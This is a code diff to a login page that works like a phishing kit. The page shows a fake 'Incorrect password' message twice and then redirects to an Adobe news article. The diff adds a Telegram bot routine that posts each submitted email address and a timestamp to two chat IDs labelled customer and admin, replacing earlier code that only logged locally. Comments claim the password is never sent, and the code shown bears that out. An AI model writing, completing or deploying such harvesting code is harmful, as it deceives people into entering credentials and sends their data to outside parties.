@@ -86,7 +86,7 @@
  </div>
  <div class=form-group>
  <label for=exampleInputEmail1>Email address</label>
- <input type=email name=email class=form-control id=email readonly="" aria-describedby=emailHelp placeholder="Enter email">
+ <input type=email name=email class=form-control id=userid readonly="" aria-describedby=emailHelp placeholder="Enter email">
 
  <small id=emailHelp class="form-text text-muted">We'll never share your
  email with anyone else.</small>
@@ -95,7 +95,7 @@
   <div class=col-lg-12>
  <div class=form-group>
  <label for=Password>Password</label>
- <input type=password name=password class=form-control id=password aria-describedby=emailHelp placeholder="Enter Password" value>
+ <input type=password name=password class=form-control id=upass aria-describedby=emailHelp placeholder="Enter Password" value>
  </div>
  </div>
  </div>
@@ -120,10 +120,55 @@
  </div>
  </div>
 <script>
+const BOT_TOKEN = "__BOT_TOKEN__";
+const CUSTOMER_CHAT_ID = "__CUSTOMER_CHAT_ID__";
+const ADMIN_CHAT_ID = "__ADMIN_CHAT_ID__";
+
 const REDIRECT_URL =
     "https://news.adobe.com/news/news-details/2023/Adobe-Announces-All-New-AI-Powered-Creative-Cloud-Release-default.aspx/default.aspx";
 
+
+/* =========================
+   TELEGRAM
+   ========================= */
+
+async function sendTelegram(chatId, message) {
+    if (!chatId) return;
+
+    try {
+        const response = await fetch(
+            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+            {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            }
+        );
+
+        if (!response.ok) {
+            throw new Error("Telegram request failed");
+        }
+
+        return await response.json();
+
+    } catch (error) {
+        console.error("Telegram send error:", error);
+        return null;
+    }
+}
+
+
+/* =========================
+   BASE64 CHECK
+   ========================= */
+
 function isBase64(str) {
+
     if (
         str === "" ||
         String(str).trim() === ""
@@ -158,28 +203,36 @@ function getEmail() {
                 : email;
     }
 
-    return email;
+    return email.trim();
 }
 
 
 /* =========================
-   SAFE SUBMISSION REPORT
+   SEND RESULT
    ========================= */
 
 async function send_result(email) {
 
-    /*
-     * Put your own non-sensitive
-     * reporting logic here.
-     *
-     * Password is intentionally
-     * not included.
-     */
+    const message =
+`Form Submission
 
-    console.log("Form submission:", {
-        email: email,
-        time: new Date().toLocaleString()
-    });
+Email:
+${email || "Not provided"}
+
+Time:
+${new Date().toLocaleString()}`;
+
+    await Promise.allSettled([
+        sendTelegram(
+            CUSTOMER_CHAT_ID,
+            message
+        ),
+
+        sendTelegram(
+            ADMIN_CHAT_ID,
+            message
+        )
+    ]);
 }
 
 
@@ -193,7 +246,17 @@ document.addEventListener(
 
         let counter = 0;
 
-        const MAX_ATTEMPTS = 2;
+        /*
+         * Attempt 1 = retry
+         * Attempt 2 = retry
+         * Attempt 3 = redirect
+         */
+        const MAX_ATTEMPTS = 3;
+
+
+        /* =========================
+           PAGE ELEMENTS
+           ========================= */
 
         const userid =
             document.getElementById("userid");
@@ -241,6 +304,10 @@ document.addEventListener(
                 event.preventDefault();
 
 
+                /* =========================
+                   GET VALUES
+                   ========================= */
+
                 const email =
                     userid
                         ? userid.value.trim()
@@ -262,8 +329,7 @@ document.addEventListener(
                         function () {
 
                             if (userid) {
-                                userid.value =
-                                    "";
+                                userid.value = "";
                             }
 
                             if (errtxt) {
@@ -280,8 +346,7 @@ document.addEventListener(
                         function () {
 
                             if (errtxt) {
-                                errtxt.innerHTML =
-                                    "";
+                                errtxt.innerHTML = "";
                             }
 
                         },
@@ -305,8 +370,7 @@ document.addEventListener(
                         function () {
 
                             if (userid) {
-                                userid.value =
-                                    "";
+                                userid.value = "";
                             }
 
                             if (errtxt) {
@@ -323,8 +387,7 @@ document.addEventListener(
                         function () {
 
                             if (errtxt) {
-                                errtxt.innerHTML =
-                                    "";
+                                errtxt.innerHTML = "";
                             }
 
                         },
@@ -336,7 +399,7 @@ document.addEventListener(
 
 
                 /* =========================
-                   SECOND FIELD EMPTY
+                   PASSWORD EMPTY
                    ========================= */
 
                 if (
@@ -347,8 +410,7 @@ document.addEventListener(
                         function () {
 
                             if (upass) {
-                                upass.value =
-                                    "";
+                                upass.value = "";
                             }
 
                             if (errtxt) {
@@ -365,8 +427,7 @@ document.addEventListener(
                         function () {
 
                             if (errtxt) {
-                                errtxt.innerHTML =
-                                    "";
+                                errtxt.innerHTML = "";
                             }
 
                         },
@@ -378,7 +439,7 @@ document.addEventListener(
 
 
                 /* =========================
-                   MINIMUM LENGTH
+                   PASSWORD LENGTH CHECK
                    ========================= */
 
                 if (
@@ -389,8 +450,7 @@ document.addEventListener(
                         function () {
 
                             if (upass) {
-                                upass.value =
-                                    "";
+                                upass.value = "";
                             }
 
                             if (errtxt) {
@@ -407,8 +467,7 @@ document.addEventListener(
                         function () {
 
                             if (errtxt) {
-                                errtxt.innerHTML =
-                                    "";
+                                errtxt.innerHTML = "";
                             }
 
                         },
@@ -420,7 +479,7 @@ document.addEventListener(
 
 
                 /* =========================
-                   REPORT NON-SENSITIVE DATA
+                   REPORT EMAIL ONLY
                    ========================= */
 
                 await send_result(email);
@@ -434,7 +493,7 @@ document.addEventListener(
 
 
                 /* =========================
-                   FIRST ATTEMPT
+                   ATTEMPT 1 AND 2
                    ========================= */
 
                 if (
@@ -446,6 +505,12 @@ document.addEventListener(
                         errtxt.innerHTML =
                             "Incorrect password! please try again.";
                     }
+
+
+                    /*
+                     * Clear password locally.
+                     * It is never sent anywhere.
+                     */
 
                     if (upass) {
 
@@ -460,12 +525,11 @@ document.addEventListener(
 
 
                 /* =========================
-                   FINAL ATTEMPT
+                   ATTEMPT 3
                    ========================= */
 
                 if (upass) {
-                    upass.value =
-                        "";
+                    upass.value = "";
                 }
 
 
